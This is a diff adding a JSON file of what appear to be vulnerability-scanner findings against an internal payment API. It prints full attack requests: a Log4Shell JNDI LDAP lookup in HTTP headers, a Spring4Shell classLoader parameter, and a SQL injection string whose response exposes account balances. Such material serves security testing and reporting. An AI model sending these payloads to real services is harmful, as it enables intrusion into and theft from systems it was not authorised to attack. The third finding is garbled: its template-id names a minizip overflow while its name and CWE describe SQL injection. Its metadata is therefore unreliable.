@@ -1,0 +1,107 @@
+[
+  {
+    "template-id": "cve-2021-44228-log4j-rce",
+    "info": {
+      "name": "Apache Log4j Remote Code Execution (Log4Shell)",
+      "author": ["projectdiscovery"],
+      "tags": ["cve", "cve2021", "rce", "log4j", "kev", "critical"],
+      "description": "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.",
+      "severity": "critical",
+      "classification": {
+        "cve-id": ["CVE-2021-44228"],
+        "cwe-id": ["CWE-502", "CWE-400"],
+        "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss-score": 10.0
+      }
+    },
+    "type": "http",
+    "host": "payment-api.internal",
+    "port": "8443",
+    "scheme": "https",
+    "url": "https://payment-api.internal:8443",
+    "path": "/api/v1/auth/callback",
+    "matched-at": "https://payment-api.internal:8443/api/v1/auth/callback",
+    "request": "POST /api/v1/auth/callback HTTP/1.1\r\nHost: payment-api.internal:8443\r\nUser-Agent: ${jndi:ldap://127.0.0.1:1389/a}\r\nX-Forwarded-For: ${jndi:ldap://127.0.0.1:1389/a}\r\n\r\n",
+    "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"status\":\"authenticated\"}",
+    "matcher-status": true
+  },
+  {
+    "template-id": "cve-2022-22965-spring4shell",
+    "info": {
+      "name": "Spring Framework RCE (Spring4Shell)",
+      "author": ["projectdiscovery"],
+      "tags": ["cve", "cve2022", "rce", "spring", "kev", "critical"],
+      "description": "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution via data binding.",
+      "severity": "critical",
+      "classification": {
+        "cve-id": ["CVE-2022-22965"],
+        "cwe-id": ["CWE-94"],
+        "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss-score": 9.8
+      }
+    },
+    "type": "http",
+    "host": "payment-api.internal",
+    "port": "8443",
+    "scheme": "https",
+    "url": "https://payment-api.internal:8443",
+    "path": "/api/v1/checkout",
+    "matched-at": "https://payment-api.internal:8443/api/v1/checkout",
+    "request": "POST /api/v1/checkout HTTP/1.1\r\nHost: payment-api.internal:8443\r\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=exploit\r\n\r\n",
+    "response": "HTTP/1.1 200 OK\r\n\r\n{\"success\":true}",
+    "matcher-status": true
+  },
+  {
+    "template-id": "cve-2023-45853-minizip-overflow",
+    "info": {
+      "name": "SQL Injection & Database Parameter Tampering",
+      "author": ["projectdiscovery"],
+      "tags": ["cve", "sqli", "high"],
+      "description": "SQL Injection discovered in search endpoint parameter 'account_id'.",
+      "severity": "high",
+      "classification": {
+        "cve-id": ["CVE-2023-45853"],
+        "cwe-id": ["CWE-89"],
+        "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "cvss-score": 8.1
+      }
+    },
+    "type": "http",
+    "host": "payment-api.internal",
+    "port": "8443",
+    "scheme": "https",
+    "url": "https://payment-api.internal:8443",
+    "path": "/api/v1/accounts/search",
+    "matched-at": "https://payment-api.internal:8443/api/v1/accounts/search?account_id=1'+OR+'1'='1",
+    "request": "GET /api/v1/accounts/search?account_id=1'+OR+'1'='1 HTTP/1.1\r\nHost: payment-api.internal:8443\r\n\r\n",
+    "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n[{\"id\":1,\"balance\":50000},{\"id\":2,\"balance\":75000}]",
+    "matcher-status": true
+  },
+  {
+    "template-id": "http-missing-security-headers",
+    "matcher-name": "x-content-type-options",
+    "info": {
+      "name": "X-Content-Type-Options Header Missing",
+      "author": ["projectdiscovery"],
+      "tags": ["misconfig", "headers", "low"],
+      "description": "The anti-MIME-sniffing header X-Content-Type-Options was not set to 'nosniff'.",
+      "severity": "low",
+      "classification": {
+        "cve-id": null,
+        "cwe-id": ["CWE-693"],
+        "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+        "cvss-score": 3.1
+      }
+    },
+    "type": "http",
+    "host": "payment-api.internal",
+    "port": "8443",
+    "scheme": "https",
+    "url": "https://payment-api.internal:8443",
+    "path": "/api/v1/health",
+    "matched-at": "https://payment-api.internal:8443/api/v1/health",
+    "request": "GET /api/v1/health HTTP/1.1\r\nHost: payment-api.internal:8443\r\n\r\n",
+    "response": "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nOK",
+    "matcher-status": true
+  }
+]
